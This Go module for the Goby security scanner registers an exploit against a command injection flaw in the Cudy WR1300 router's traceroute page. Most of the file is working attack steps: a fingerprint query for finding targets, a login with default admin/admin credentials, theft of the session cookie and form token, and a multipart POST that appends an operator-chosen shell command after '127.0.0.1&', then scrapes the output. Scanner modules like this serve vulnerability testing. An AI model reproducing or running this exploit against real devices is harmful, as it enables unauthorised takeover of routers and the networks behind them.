package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WR1300 traceroute Command Execution Vulnerability",
    "Description": "<p>Shenzhen Cudy Technology Co., Ltd. WR1300 is a wireless product integrating WAN, LAN, wireless 2.4G/5G, IPV6 and DHCP functions.</p><p>WR1300 of Shenzhen Cudy Technology Co., Ltd. has a command execution vulnerability. An attacker can use this vulnerability to arbitrarily execute code on the server side, write to the back door, and obtain server permissions, thereby controlling the entire web server.</p>",
    "Product": "WR1300",
    "Homepage": "https://www.cudy.com/",
    "DisclosureDate": "2022-11-15",
    "Author": "heiyeleng",
    "FofaQuery": "body=\"/cgi-bin/luci\" && body=\"timeclock\"",
    "GobyQuery": "body=\"/cgi-bin/luci\" && body=\"timeclock\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Strictly filter the data entered by the user and prohibit the execution of unexpected system commands.</p><p>2. Reduce or do not use code or commands to execute functions.</p><p>3. The variables submitted by the client are detected before being put into the function.</p><p>4. Reduce or not use dangerous functions.</p><p>5. Please follow the manufacturer's announcement on the latest vulnerability patch: <a href=\"https://www.cudy.com/\">https://www.cudy.com/</a>.</p>",
    "References": [
        "https://fofa.info"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "command",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/luci",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "timeclock=1668525846&luci_language=auto&luci_username=admin&luci_password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location: /cgi-bin/luci/",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "regex",
                        "value": "Set-Cookie: sysauth=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Cookie|lastheader|regex|Set-Cookie: sysauth=(.*?); path=/cgi-bin/luci/"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/luci/admin/network/traceroute?nomodal=",
                "follow_redirect": false,
                "header": {
                    "Cookie": "sysauth={{{Cookie}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "form-horizontal",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "name=\"token\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|name=\"token\" value=\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/luci/admin/network/traceroute?nomodal=",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryWa81b2HLyaCj14LA",
                    "Cookie": "sysauth={{{Cookie}}}"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n0636469367493d4c8201b82c14b555a9\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"timeclock\"\r\n\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"cbi.submit\"\r\n\r\n1\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"cbid.traceroute.1.addr\"\r\n\r\n127.0.0.1&id\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"cbid.traceroute.1.refresh\"\r\n\r\nTRACEROUTE\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"cbid.traceroute.1._custom\"\r\n\r\n\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "name=\"token\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "traceroute to",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/luci",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "timeclock=1668525846&luci_language=auto&luci_username=admin&luci_password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location: /cgi-bin/luci/",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "regex",
                        "value": "Set-Cookie: sysauth=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Cookie|lastheader|regex|Set-Cookie: sysauth=(.*?); path=/cgi-bin/luci/"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/luci/admin/network/traceroute?nomodal=",
                "follow_redirect": false,
                "header": {
                    "Cookie": "sysauth={{{Cookie}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "form-horizontal",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "name=\"token\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|name=\"token\" value=\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/luci/admin/network/traceroute?nomodal=",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryWa81b2HLyaCj14LA",
                    "Cookie": "sysauth={{{Cookie}}}"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n0636469367493d4c8201b82c14b555a9\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"timeclock\"\r\n\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"cbi.submit\"\r\n\r\n1\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"cbid.traceroute.1.addr\"\r\n\r\n127.0.0.1&{{{command}}}\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"cbid.traceroute.1.refresh\"\r\n\r\nTRACEROUTE\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA\r\nContent-Disposition: form-data; name=\"cbid.traceroute.1._custom\"\r\n\r\n\r\n------WebKitFormBoundaryWa81b2HLyaCj14LA--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "name=\"token\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "traceroute to",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|readonly=\"true\">((.|\n)*?)traceroute to"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "深圳市多酷科技有限公司 WR1300 traceroute 后台命令执行漏洞",
            "Product": "WR1300",
            "Description": "<p>深圳市多酷科技有限公司WR1300是一款集WAN、局域网、无线2.4G/5G、IPV6、DHCP功能于一体的无线产品。<br></p><p>深圳市多酷科技有限公司WR1300存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p><p>2、减少或不使用代码或命令执行函数。</p><p>3、客户端提交的变量在放入函数前进行检测。</p><p>4、减少或不使用危险函数。</p><p>5、请关注厂商发布最新漏洞补丁的公告：<a href=\"https://www.cudy.com/\" target=\"_blank\" style=\"\">https://www.cudy.com/</a>。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "WR1300 traceroute Command Execution Vulnerability",
            "Product": "WR1300",
            "Description": "<p>Shenzhen Cudy Technology Co., Ltd. WR1300 is a wireless product integrating WAN, LAN, wireless 2.4G/5G, IPV6 and DHCP functions.</p><p>WR1300 of Shenzhen Cudy Technology Co., Ltd. has a command execution vulnerability. An attacker can use this vulnerability to arbitrarily execute code on the server side, write to the back door, and obtain server permissions, thereby controlling the entire web server.</p>",
            "Recommendation": "<p>1. Strictly filter the data entered by the user and prohibit the execution of unexpected system commands.</p><p>2. Reduce or do not use code or commands to execute functions.</p><p>3. The variables submitted by the client are detected before being put into the function.</p><p>4. Reduce or not use dangerous functions.</p><p>5. Please follow the manufacturer's announcement on the latest vulnerability patch: <a href=\"https://www.cudy.com/\" target=\"_blank\">https://www.cudy.com/</a>.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
